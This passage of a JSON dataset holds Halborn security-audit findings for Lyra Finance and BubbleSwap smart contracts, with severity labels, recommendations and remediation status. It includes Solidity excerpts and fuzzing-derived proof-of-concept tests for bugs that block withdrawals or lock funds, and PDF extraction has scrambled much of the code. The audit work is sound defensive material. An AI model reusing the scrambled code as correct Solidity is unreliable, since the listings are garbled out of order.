new value of skew is less than gwavSkewFloor or greater than gwavSkewCap. Remediation plan: RISK ACCEPTED: The Lyra team accepted the risk of this finding and stated that feeding the GWAV oracle with a capped skew value (different from the one cached) in edge cases is intentional behavior of the protocol. 26 ",
        "labels": [
            "Halborn",
            "Lyra_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "WITHDRAWALS GET TEMPORARILY BLOCKED WHEN CREATING BOARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When the owner creates a new board, the addBoard function from triggers called. OptionGreekCache function _updateGlobalLastUpdatedAt, which sets the value of minUpdatedAtPrice to 0. contract This is As a consequence, users will not be able to withdraw from the liquid- ity pool (processWithdrawalQueue) because _canProcess will always return false until someone explicitly calls the updateBoardCachedGreeks function to update the cache with the actual values. Code Location: addBoard function triggers _updateGlobalLastUpdatedAt: Listing 9: OptionGreekCache.sol (Line 336) 323 boardCache . expiry = board . expiry ; 324 boardCache . iv = board . iv ; 325 boardCache . updatedAt = block . timestamp ; 326 emit BoardCacheUpdated ( boardCache ); 327 boardIVGWAV [ board . id ]. _initialize ( board . iv , block . timestamp ); 328 emit BoardIvUpdated ( boardCache . id , board .iv , globalCache .  maxIvVariance ); 329 330 liveBoards . push ( board . id ); 331 332 for ( uint i = 0; i < strikes . length ; i ++) { 333 _addNewStrikeToStrikeCache ( boardCache , strikes [ i ]. id , strikes [ i ].  strikePrice , strikes [i ]. skew ); 334 } 335 336 _updateGlobalLastUpdatedAt () ; 27 _updateGlobalLastUpdatedAt function sets minUpdatedAtPrice to 0: Listing 10: OptionGreekCache.sol (Lines 822,836) minUpdatedAt = boardCache . updatedAt ; maxUpdatedAtPrice = boardCache . updatedAtPrice ; minUpdatedAtPrice = boardCache . updatedAtPrice ; } if ( boardCache . updatedAtPrice > maxUpdatedAtPrice ) { } if ( boardCache . updatedAtPrice < minUpdatedAtPrice ) { 816 for ( uint i = 1; i < liveBoards . length ; i ++) { boardCache = boardCaches [ liveBoards [ i ]]; 817 818 if ( boardCache . updatedAt < minUpdatedAt ) { 819 820 821 822 823 824 825 826 827 828 829 830 831 832 833 } 834 835 globalCache . minUpdatedAt = minUpdatedAt ; 836 globalCache . minUpdatedAtPrice = minUpdatedAtPrice ; } if ( boardCache . ivVariance > maxIvVariance ) { } if ( boardCache . maxSkewVariance > maxSkewVariance ) { maxSkewVariance = boardCache . maxSkewVariance ; maxIvVariance = boardCache . ivVariance ; } Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to change the visibility of the updateBoardCachedGreeks function to public and update addBoard to call this function instead of _updateGlobalLastUpdatedAt. Remediation plan: SOLVED: The issue was fixed in commit 1e04d54b12c4faf0378b54b67f93d5de2b7c6e68. 28 ",
        "labels": [
            "Halborn",
            "Lyra_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "INACCURATE VALIDITY CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The updateCacheAndGetTradeResult function in the OptionMarketPricer con- tract contains the following inaccurate validity checks:  newSkew includes min / max values in its validity check. As a consequence, the function will revert incorrectly when dealing with edge values.  pricing.callDelta does not include min / max values in its validity check. As a consequence, the function will not revert when dealing with edge values, as it should. This issue is categorized as informational because it could cause the aforementioned function to not work as expected in edge cases. Code Location: Listing 11: OptionMarketPricer.sol (Line 262) 259 // If it is a force close and skew ends up outside the \" abs min /  max \" thresholds 260 if ( 261 262 trade . tradeDirection != OptionMarket . TradeDirection . LIQUIDATE && ( newSkew <= tradeLimitParams . absMinSkew || newSkew >=  tradeLimitParams . absMaxSkew ) 263 ) { 264 revert ForceCloseSkewOutOfRange ( Listing 12: OptionMarketPricer.sol (Lines 328-329) 326 // delta must fall BELOW the min or ABOVE the max to allow for  force closes 327 if ( 328 pricing . callDelta > tradeLimitParams . minForceCloseDelta && 29 329 pricing . callDelta < ( int ( DecimalMath . UNIT ) - tradeLimitParams .  minForceCloseDelta ) 330 ) { 331 revert ForceCloseDeltaOutOfRange ( Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to correct validity checks as mentioned above to avoid unexpected behavior in the updateCacheAndGetTradeResult function when dealing with edge values. Remediation plan: ACKNOWLEDGED: The Lyra team acknowledged this finding. 30 ",
        "labels": [
            "Halborn",
            "Lyra_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "CHANGES CAN BE MADE IN EXPIRED BOARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The following operations in OptionMarket contract affect boards, even if they are already expired:  Base IV can be set on an expired board  Skew can be set on a strike from an expired board  Strikes can be added on an expired board It is worth noting that this issue is classified as informational because it does not affect the settlement process, but could cause the owner to spend more gas unnecessarily if they mistakenly interact with an expired board. Code Location: Listing 13: OptionMarket.sol (Lines 264,276,277) 264 function setBoardBaseIv ( uint boardId , uint baseIv ) external  onlyOwner { 265 266 267 268 269 270 OptionBoard storage board = optionBoards [ boardId ]; if ( board . id != boardId ) { revert InvalidBoardId ( address ( this ) , boardId ); } if ( baseIv == 0) { revert ExpectedNonZeroValue ( address ( this ) , NonZeroValues .  BASE_IV ); } if (! board . frozen ) { 271 272 273 274 275 276 277 278 revert BoardNotFrozen ( address ( this ) , boardId ); } board . iv = baseIv ; greekCache . setBoardIv ( boardId , baseIv ); emit BoardBaseIvSet ( boardId , baseIv ); 31 Listing 14: OptionMarket.sol (Lines 286,300,301) 286 function setStrikeSkew ( uint strikeId , uint skew ) external  onlyOwner { Strike storage strike = strikes [ strikeId ]; if ( strike . id != strikeId ) { revert InvalidStrikeId ( address ( this ) , strikeId ); } if ( skew == 0) { revert ExpectedNonZeroValue ( address ( this ) , NonZeroValues . SKEW ); } OptionBoard memory board = optionBoards [ strike . boardId ]; if (! board . frozen ) { revert BoardNotFrozen ( address ( this ) , board . id ); } strike . skew = skew ; greekCache . setStrikeSkew ( strikeId , skew ); emit StrikeSkewSet ( strikeId , skew ); 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 } Listing 15: OptionMarket.sol (Lines 312,319,320) uint boardId , uint strikePrice , uint skew 312 function addStrikeToBoard ( 313 314 315 316 ) external onlyOwner { 317 318 OptionBoard storage board = optionBoards [ boardId ]; if ( board . id != boardId ) revert InvalidBoardId ( address ( this ) ,  boardId ); 319 Strike memory strike = _addStrikeToBoard ( board , strikePrice ,  skew ); 320 greekCache . addStrikeToBoard ( boardId , strike . id , strikePrice ,  skew ); 321 } Risk Level: Likelihood - 2 Impact - 1 32 Recommendation: It is recommended that the functions mentioned above be reverted if they are called for expired boards. Remediation plan: ACKNOWLEDGED: The Lyra team acknowledged this finding. 33 ",
        "labels": [
            "Halborn",
            "Lyra_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "USING ++I CONSUMES LESS GAS THAN I++ IN LOOPS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Lyra_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the following loops, the i variable is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. Proof of Concept: For example, based on the following test contract: Listing 16: Test.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.9; 3 4 contract test { 5 6 7 8 9 10 11 12 13 } } function postiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; i ++) { } } function preiincrement ( uint256 iterations ) public { for ( uint256 i = 0; i < iterations ; ++ i) { } We can see the difference in the gas costs: 34 Code Location: Listing 17: LiquidityPool.sol (Line 313) ( uint tokenPrice , bool stale , ) = _getTokenPriceAndStale () ; 310 function processDepositQueue ( uint limit ) external nonReentrant { 311 312 313 314 QueuedDeposit storage current = queuedDeposits [ for ( uint i = 0; i < limit ; i ++) {  queuedDepositHead ]; 315 if (! _canProcess ( current . depositInitiatedTime , lpParams .  depositDelay , stale , queuedDepositHead )) { 316 317 return ; } Listing 18: LiquidityPool.sol (Line 341) 340 function processWithdrawalQueue ( uint limit ) external nonReentrant  { 341 342 for ( uint i = 0; i < limit ; i ++) { ( uint totalTokensBurnable , uint tokenPriceWithFee , bool  stale ) = _getTotalBurnableTokens () ; Listing 19: Other resources affected 1 2 3 4 5 GWAV : L #136 OptionGreekCache : L #332 , 348 , 352 , 726 , 816 , 878 , 913 , 922 , 1000 OptionMarket : L #236 , 393 , 415 , 458 , 744 , 972 , 1009 OptionToken : L #300 , 509 , 591 , 605 , 616 ShortCollateral : L #172 35 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of a uint variable inside a loop. This is not applicable outside of loops. Remediation plan: SOLVED: The issue was fixed in commit 1e04d54b12c4faf0378b54b67f93d5de2b7c6e68. 36 3.10 (HAL-10) CACHING ARRAY LENGTH IN FOR LOOPS CAN SAVE GAS - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Lyra_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "ARITHMETIC ERROR CAN RESULT IN LOCKED USER FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The collect function of the ContentratedLiquidityPoolManager.sol contract does not withdraw the correct amount from the vaults. By withdrawing an improper amount, when a user under certain conditions tries to burn part or all of his position the contract reverts due to an arithmetic error in the withdraw function of the ConcetratedLiquidityPool.sol contract. Code Location: Location - ConcentratedLiquidityPoolManager.sol#L210 Listing 1: ConcentratedLiquidityPoolManager.sol (Line 210) 192 function collect ( int64 tokenId ) public returns ( uint256  token0amount , uint256 token1amount ) { 193 require ( msg . sender == ownerOf ( uint256 ( int256 ( tokenId )) ) , \"  NOT_ID_OWNER \"); 194 195 196 Position storage position = positions [ tokenId ]; PositionFeesData memory positionFeesData = positionFees (  tokenId ); 197 198 token0amount = positionFeesData . token0amount + position .  unclaimedFees0 ; 199 token1amount = positionFeesData . token1amount + position .  unclaimedFees1 ; 200 201 202 203 204 205 206 207 208 209 position . unclaimedFees0 = 0; position . unclaimedFees1 = 0; position . feeGrowthInside0 = positionFeesData . feeGrowthInside0 ; position . feeGrowthInside1 = positionFeesData . feeGrowthInside1 ; uint256 balance0 = position . pool . vault0 ( address ( this )) ; uint256 balance1 = position . pool . vault1 ( address ( this )) ; 15 210 211 if ( balance0 < token0amount || balance1 < token1amount ) { ( uint256 amount0fees , uint256 amount1fees ) = position . pool  . collect ( position . lower , position . upper ); 212 213 214 215 216 uint256 newBalance0 = amount0fees + balance0 ; uint256 newBalance1 = amount1fees + balance1 ; // Rounding errors due to frequent claiming of other users  in the same position may cost us some wei units . 217  ; 218  ; 219 220 221 if ( token0amount > newBalance0 ) token0amount = newBalance0 if ( token1amount > newBalance1 ) token1amount = newBalance1 } _transferBoth ( position . pool , msg . sender , token0amount ,  token1amount ); 222 223 emit Collect ( uint256 ( int256 ( tokenId )) , msg . sender ,  token0amount , token1amount ); 224 } Risk Level: Likelihood - 4 Impact - 4 Proof Of Concept: The next test found through fuzzing triggered the previously described behavior. Location - Invariant.t.sol#L379 Listing 2 1 function testWithdrawRevert () public { 2 3 4 setupEnv () ; State memory state ; 16 state . pool = Pool ( 0, false ); state . mints = [ Mint (0 , 0 , 4294965963 , 4294965963 , 0, 5 6  1461501610815035672193089625368183178509592374988) , Mint (0 , 0 , 0,  0, 0, 102382895725905434422964234) , Mint (0 , 0 , 0, 0, 4727003 ,  4727003) , Mint (0 , 0, 5, 5 ,  1461501610815035672193089625368183178509592374988 , 0) , Mint (0 , 0,  0, 0, 57866823689572764762770813391297409132144668 ,  50066467198429302992085375296889841655755873) , Mint (0 , 0 , 0 , 0 , 0,  0) , Mint (0 , 0, 0, 0,  1461008357146354474159968841821869770755632007064 ,  79347087983666005040985389675) , Mint (0 , 0 , 0 , 0 ,  102536577618133000677376439 , 0) , Mint (0 , 0 , 0 , 0 ,  1708172910815791427074259 , 0) , Mint (0 , 0 , 0, 0, 0 , 0) , Mint (0 , 0,  0, 0, 1461501610815035672193089625368183178509592374988 , 0) , Mint  (0 , 0, 0, 0, 1461008357146354474159968841821869770755632007064 ,  19861840684872087267822641043486) , Mint (0 , 0 , 0 , 0 , 0 , 1718308) ,  Mint (0 , 0, 0, 0, 0 , 0) , Mint (0 , 0 , 0, 0 , 0 ,  50257238252836758370807292880) , Mint (0 , 0 , 0 , 0 ,  54907329825568905816573164194356135163533386 , 4727003) , Mint (0 , 0,  0, 0, 1461501610815035672193089625368183178509592374988 , 0) , Mint  (0 , 0, 0, 0, 118962878524044395906683687737 ,  40564819207303340847894502572031) , Mint (982160 , 0, 6279209 , 1,  318130942495380 ,  1461501637330902918203684832716283019655932542975) , Mint (784 ,  8388605 , 4294967292 , 4294967293 ,  143098884273794505002571482528426511690462931 ,  1461501637330902918203684832716283019655932542974) ]; 7  ( false , 1601746) , Swap ( false , 0) , Swap ( true , 1) , Swap ( true ,  4294967294) , Swap ( false , 4294967295) , Swap ( false , 15) , Swap ( false ,  13) , Swap ( false , 1) , Swap ( false , 2) , Swap ( false , 481) , Swap ( false  , 231) , Swap ( true , 4294967293) , Swap ( false , 3) , Swap ( false ,  730302967) , Swap ( true , 288226250) , Swap ( false , 4294967292) , Swap (  true , 2) , Swap ( true , 214470) , Swap ( false , 0) , Swap ( false , 1) , Swap  ( false , 17) , Swap ( true , 789862) , Swap ( false , 3) , Swap ( true , 2) ,  Swap ( false , 2) , Swap ( false , 3) , Swap ( true , 2044119666) , Swap ( false  , 814237) , Swap ( false , 0) , Swap ( true , 9844803) , Swap ( false , 2) ,  Swap ( true , 14889) , Swap ( true , 4294967294) , Swap ( true , 11944) , Swap  ( false , 17337554) , Swap ( false , 4294967294) , Swap ( false , 7) , Swap (  false , 3) , Swap ( true , 4294967293) , Swap ( true , 22) , Swap ( true ,  4294967295) , Swap ( true , 249862) , Swap ( false , 244) , Swap ( true , 0) ,  Swap ( false , 0) , Swap ( false , 1537) , Swap ( false , 0) , Swap ( true ,  64239484) ]; state . swaps = [ Swap ( false , 6728842) , Swap ( true , 2256334) , Swap 17 state . burns = [ Burn (2) , Burn (514532) , Burn (0) , Burn 8  (4294967292) , Burn (250585) , Burn (1) , Burn (3) , Burn (46378427) , Burn  (4294967292) , Burn (72158) ]; 9 state . collects = 64339; 10 11 12 13 } state = _validateStateInternal ( state ); setUpStateMoreRandom ( state ); As explained before, this test reverts when trying to withdraw liquidity from the pool through the manager contract. The revert error can be observed in the next screenshot. Recommendation: Consider removing the if flow statement on the collect function of the manager who creates an error that accumulates after several transactions makes it not possible for users to withdraw their liquidity. Remediation Plan: SOLVED: The BubbleSwap team removed the if statement in the following commitId 07c873d250d3e5ffed5b8c0df7baaea2f72ee13d. 18 ",
        "labels": [
            "Halborn",
            "BubbleSwap_Concentrated_Liquidity_Pool_AMM",
            "Severity: High"
        ]
    },
    {
        "title": "IMPROPER SWAP AMOUNTS HANDLING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ConcentratedLiquidityPool.sol contract does not handle properly the errors when performing a swap that requires giving away a higher amount of tokens than the pool currently has. This ends in a revert arithmetic overflow error. Code Location: Location - ConcentratedLiquidityPool.sol Listing 3: ConcentratedLiquidityPool.sol 559 if ( swapParams . zeroForOne ) { 560 561 if ( swapSnapshot . isAmountInGiven ) { require ( swapSnapshot . end . balance0 >= swapSnapshot . start .  balance0 , \" IIA -0 a \" ); } else { 562 563 require (( swapSnapshot . end . balance0 - swapSnapshot . start .  balance0 ) >= actualIn , \" IIA -0 b\" ); 564 565 566 } require (( swapSnapshot . start . balance1 - swapSnapshot . end .  balance1 ) <= amountOut , \" IIA -0 c \" ); 567 } else { 568 569 if ( swapSnapshot . isAmountInGiven ) { require ( swapSnapshot . end . balance1 >= swapSnapshot . start .  balance1 , \" IIA -1 a \" ); } else { 570 571 require (( swapSnapshot . end . balance1 - swapSnapshot . start .  balance1 ) >= actualIn , \" IIA -1 b\" ); 572 573 574 } require (( swapSnapshot . start . balance0 - swapSnapshot . end .  balance0 ) <= amountOut , \" IIA -1 c \" ); 575 } 19 Proof Of Concept: The next code snippet reproduces the previously described issue. Listing 4 addLiquidityManager ( pool , address ( token0 ) , address ( token1 ) , address pool = deployPool ( address ( token0 ) , address ( token1 ) , 0 function testSwapRevert () public { 1 2  1500 , 79228162514264337593543950336 ) ; 3  1000 , 1000 , -887272 , 887272) ; 4 5  address ( token0 ) , address ( token1 ) , 1500 , address ( this ) , 1001 , 0, 0)  ; 6 } uint256 _amountOutFinal = swapExactInputSingleRouter ( pool , As described before, when executing the test, it triggers the arithmetic overflow/underflow revert error. Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider adding a mechanism to control the error and swapping the corre- sponding number of tokens. Remediation Plan: SOLVED: The BubbleSwap team solved the issue by modifying the conditions in the following commitId 38755a333ae2eb46b6bf0ee94e659752a7356097. 20 ",
        "labels": [
            "Halborn",
            "BubbleSwap_Concentrated_Liquidity_Pool_AMM",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNCONTROLLED FEEGROWTH ERROR WHEN ADDING LIQUIDITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The function rangeFeeGrowth of the contract ConcentratedLiquidityPool. sol does not handle the feegrowth variables properly. Thus, when adding liquidity, the function might revert with an arithmetic error. Code Location: Location - ConcentratedLiquidityPool.sol Listing 5: ConcentratedLiquidityPool.sol 700 function rangeFeeGrowth ( int24 lowerTick , int24 upperTick ) public  view returns ( uint256 feeGrowthInside0 , uint256 feeGrowthInside1 )  { 701 int24 currentTick = TickMath . getTickAtSqrtRatio ( price ); //  https :// github . com / sushiswap / trident / issues /338 702 703 704 705 706 707 708 709 710 711 712 713 714 715 716 717 718 RichTick storage lower = richTicks [ lowerTick ]; RichTick storage upper = richTicks [ upperTick ]; // Calculate fee growth below & above . uint256 _feeGrowthGlobal0 = feeGrowthGlobal0 ; uint256 _feeGrowthGlobal1 = feeGrowthGlobal1 ; uint256 feeGrowthBelow0 ; uint256 feeGrowthBelow1 ; uint256 feeGrowthAbove0 ; uint256 feeGrowthAbove1 ; if ( lowerTick <= currentTick ) { feeGrowthBelow0 = lower . feeGrowthOutside0 ; feeGrowthBelow1 = lower . feeGrowthOutside1 ; } else { 21 719 feeGrowthBelow0 = _feeGrowthGlobal0 - lower .  feeGrowthOutside0 ; 720 feeGrowthBelow1 = _feeGrowthGlobal1 - lower .  feeGrowthOutside1 ; 721 722 723 724 725 726 727 } if ( currentTick < upperTick ) { feeGrowthAbove0 = upper . feeGrowthOutside0 ; feeGrowthAbove1 = upper . feeGrowthOutside1 ; } else { feeGrowthAbove0 = _feeGrowthGlobal0 - upper .  feeGrowthOutside0 ; 728 feeGrowthAbove1 = _feeGrowthGlobal1 - upper .  feeGrowthOutside1 ; 729 730 731 } feeGrowthInside0 = _feeGrowthGlobal0 - feeGrowthBelow0 -  feeGrowthAbove0 ; 732 feeGrowthInside1 = _feeGrowthGlobal1 - feeGrowthBelow1 -  feeGrowthAbove1 ; 733 } Risk Level: Likelihood - 3 Impact - 3 Proof Of Concept: The next code snippet triggers the previously described issue. Listing 6 setupEnv () ; State memory state ; 1 function testAddLiquidityRevert () public { 2 3 4 5 6  818616501176165588061273257) , Mint (0 , 0 , 0 , 0 , 8168092 , 0) , Mint  (0 , 0, 0, 0, 721131900230629477205130399 , state . pool = Pool ( 0, false ); state . mints = [ Mint (0 , 0 , 0 , 0 , 0 , 22 state . swaps = [ Swap ( false , 2) , Swap ( false , 0) , Swap ( false , 0) ,  818616501176165588061273257) , Mint (0 , 0 , 0 , 0 , 4727003 , 674644605)  , Mint (0 , 0, 0, 0, 719547233055170467478228628 , 0) , Mint (0 , 0 , 0,  0, 0, 14627558) , Mint (0 , 0 , 0, 0, 0 , 21096719) , Mint (0 , 0 , 0, 0,  0, 0) , Mint (0 , 0, 0, 0 , 720627309756840161963903827 , 0) , Mint (0 ,  0, 0, 0, 0, 1718308) , Mint (0 , 0 , 0, 0,  720627309756840161963903827 , 4727003) , Mint (0 , 0 , 0, 0, 0 , 0) ,  Mint (0 , 0, 0, 0, 0 , 0) , Mint (0 , 0 , 0, 0 , 0 , 0) , Mint (0 , 0 , 0, 0,  0, 0) , Mint (0 , 0, 0, 0 , 0 , 0) , Mint (0 , 0 , 0, 0, 0 , 0) , Mint (0 , 0,  0, 0, 0, 0) , Mint (0 , 0, 0 , 0, 0 , 0) , Mint (0 , 0 , 0, 0, 0 , 0) ]; 7  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) ,  Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 0) , Swap ( false , 63) ,  Swap ( false , 4294967295) , Swap ( true , 2) , Swap ( false , 27978) , Swap (  true , 326545111) , Swap ( true , 4294967293) , Swap ( false , 79310) , Swap  ( false , 0) , Swap ( true , 1596228) , Swap ( true , 31) , Swap ( false , 1) ,  Swap ( true , 268219) ]; 8  Burn (3) , Burn (703) , Burn (3) , Burn (3) , Burn (3) , Burn (2) ]; 9 10 11 12 13 } state = _validateStateInternal ( state ); setUpStateMoreRandom ( state ); state . burns = [ Burn (7) , Burn (2) , Burn (4294967293) , Burn (2) , state . collects = 108; As it can be observed, the execution ends with the revert error previously mentioned. 23 Recommendation: Consider allowing the range fee growth to overflow/underflow the same way UniswapV3 does. Remediation Plan: SOLVED: The BubbleSwap team solved the issue in the following commitId a520bb7cf8162171c8d3fb18d17d10c07edb2b80. 24 ",
        "labels": [
            "Halborn",
            "BubbleSwap_Concentrated_Liquidity_Pool_AMM",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBILITY TO CREATE AN INCENTIVE FOR A DELETED POOL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Hedera network deletes a contract if it does not pay a rent to the network. All the pools are supposed to receive money when adding/burning funds. However, there is a chance that a pool gets deleted over time. However, if a pool is deleted, the Factory will still keep the address as an existing one. Thus, making it possible to create an incentive through the staker contract for a deleted pool. Code Location: Location - ConcentratedLiquidityPoolStaker.sol Listing 7: ConcentratedLiquidityPoolStaker.sol require ( incentive . minSpacing > 0 && incentive . maxSpacing > 0, require ( factory . poolExists ( _pool ) , \" INVALID_POOL \" ); require ( incentive . minSpacing <= incentive . maxSpacing , \" require ( incentive . minSpacing <= MAX_SPACING && incentive . 73 function addIncentive ( address _pool , Incentive memory incentive )  public payable costsCentiCents (1 _000 , 2) { 74 75 76  \" NULL_TICK_SPACING \"); 77  maxSpacing <= MAX_SPACING , \" EXCEEDS_MAX_TICK_SPACING \" ); 78  INVALID_MIN_MAX_SPACING \"); 79 80  owner 81 82  _pool ); 83 84 85 uint32 current = uint32 ( block . timestamp ); require ( current <= incentive . startTime , \" ALREADY_STARTED \"); incentive . owner = msg . sender ; // force msg . sender to be the IConcentratedLiquidityPool pool = IConcentratedLiquidityPool ( 25 require ( incentive . startTime < incentive . endTime , \" require ( incentive . endTime + 30 days < incentive . expiry , \" 86  START_PAST_END \" ); 87  END_PAST_BUFFER \"); // allow users to claimRewards for at least 30  days after endTime ; after which the incentive may have expired and  reclaimIncentive may be called 88 89 90 91  ( this ) , int64 ( incentive . rewardsUnclaimed )) ; 92  ; 93 } require ( incentive . rewardsUnclaimed != 0 , \" NO_REWARDS \" ); incentive . secondsClaimed = 0; incentives [ pool ][ incentiveCount [ pool ]++] = incentive ; SafeHTS . safeTransferToken ( incentive . token , msg . sender , address emit AddIncentive ( pool , incentiveCount [ pool ], incentive . token ) Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider creating an administrator remove function, so when Hedera network deletes a pool, is it also possible to remove it from the manager. Currently, the BubbleSwap team created the next HIP to try to ensure a network mechanism that prevents this from happening. Remediation Plan: RISK ACCEPTED: The BubbleSwap team accepted the risk of this issue. 26 ",
        "labels": [
            "Halborn",
            "BubbleSwap_Concentrated_Liquidity_Pool_AMM",
            "Severity: Low"
        ]
    },
    {
        "title": "POOL SHOULD RETURN FUNDS WHEN ADDING EXTRA LIQUIDITY VIA DIRECT MINT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BubbleSwap_Concentrated_Liquidity_Pool_AMM_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ConcentratedLiquidityPool.sol contracts allows sending the funds be- fore executing the mint function. However, if more funds than the required ones by the pool are sent, the pool will keep those extra funds and not return them to the user. Code Location: Code Section - ConcentratedLiquidityPool.sol#L176 Listing 8 176 function _mint ( MintParams memory mintParams ) internal returns (  uint256 liquidityMinted , uint128 amount0Actual , uint128  amount1Actual ) { 177 178 179 _ensureTickSpacing ( mintParams . lower , mintParams . upper ); uint256 priceLower = uint256 ( TickMath . getSqrtRatioAtTick (  mintParams . lower )); 180 uint256 priceUpper = uint256 ( TickMath . getSqrtRatioAtTick (  mintParams . upper )); 181 182 183 184 185 186 187 188 189 190 191 uint256 currentPrice = uint256 ( price ); liquidityMinted = DyDxMath . getLiquidityForAmounts ( priceLower , priceUpper , currentPrice , uint256 ( mintParams . amount1Desired ) , uint256 ( mintParams . amount0Desired ) ); // Ensure no overflow happens when we cast from uint256 to  int128 . 27 192 if ( liquidityMinted > uint128 ( type ( int128 ). max )) revert  Overflow () ; 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 if ( liquidityMinted == 0) { revert NullLiquidity () ; } _updateSecondsPerLiquidity ( uint256 ( liquidity )) ; TickParams memory tickParams = TickParams ({ lowerOld : mintParams . lowerOld , lower : mintParams . lower , upperOld : mintParams . upperOld , upper : mintParams . upper }) ; // / @dev insert () is called before _updatePosition () as  _updatePosition () requires the latest tick growth outside data  including that for newly initialised ticks 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 nearestTick = Ticks . insert ( startTicks , ticks , richTicks , feeGrowthGlobal0 , feeGrowthGlobal1 , secondsGrowthGlobal , tickParams , uint128 ( liquidityMinted ) , nearestTick , uint160 ( currentPrice ) ); unchecked { ( uint256 amount0Fees , uint256 amount1Fees ) =  _updatePosition ( 223 224 225 226 227 228 229 230 msg . sender , mintParams . lower , mintParams . upper , int128 ( uint128 ( liquidityMinted )) ); if ( amount0Fees > 0) { _deposit ( true , msg . sender , amount0Fees ); // / @dev Unlike the original Trident implementation  since the amount {0 ,1} Fees are still being custodied by the pool 's 28  vault {0 ,1} there 's no reason to decrease reserve {0 ,1} 231 232 233 234 235 236 237 238 // reserve0 -= uint128 ( amount0Fees ); } if ( amount1Fees > 0) { _deposit ( false , msg . sender , amount1Fees ); // reserve1 -= uint128 ( amount1Fees ); } if ( priceLower <= currentPrice && currentPrice <  priceUpper ) liquidity += uint128 ( liquidityMinted ); 239 240 241 } ( amount0Actual , amount1Actual ) = DyDxMath .  getAmountsForLiquidity ( priceLower , priceUpper , currentPrice ,  liquidityMinted , true ); 242 243 IPositionManager ( msg . sender ). mintCallback ( token0 , token1 ,  amount0Actual , amount1Actual ); 244 245 246 247 248 249 250 251 252 if ( amount0Actual != 0) { uint128 _reserve0 = reserve0 ; _reserve0 += amount0Actual ; reserve0 = _reserve0 ; uint128 actualReserves0 = uint128 ( _balance ( token0 )) ; // / @dev SLOAD reserve {0 ,1} for gas savings if ( _reserve0 > actualReserves0 ) revert Token0Missing (  _reserve0 , actualReserves0 , amount0Actual ); 253 254 255 256 257 258 259 260 261 } if ( amount1Actual != 0) { uint128 _reserve1 = reserve1 ; _reserve1 += amount1Actual ; reserve1 = _reserve1 ; uint128 actualReserves1 = uint128 ( _balance ( token1 )) ; if ( _reserve1 > actualReserves1 ) revert Token1Missing (  _reserve1 , actualReserves1 , amount1Actual ); 262 263 264 } emit Mint ( msg . sender , msg . sender , mintParams . lower , mintParams  . upper , uint128 ( liquidityMinted ) , amount0Actual , amount1Actual ); 265 } 29 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider implementing a mechanism to give back the extra funds to the user. Remediation Plan: RISK ACCEPTED: The BubbleSwap team accepted the risk of this issue. The reason behind this is that users should be forced to implement the callback function where the amount to transfer funds is specified from the pool. Adding liquidity should not be done by sending funds directly to the pool. 30 ",
        "labels": [
            "Halborn",
            "BubbleSwap_Concentrated_Liquidity_Pool_AMM",
            "Severity: Low"
        ]
    },
    {
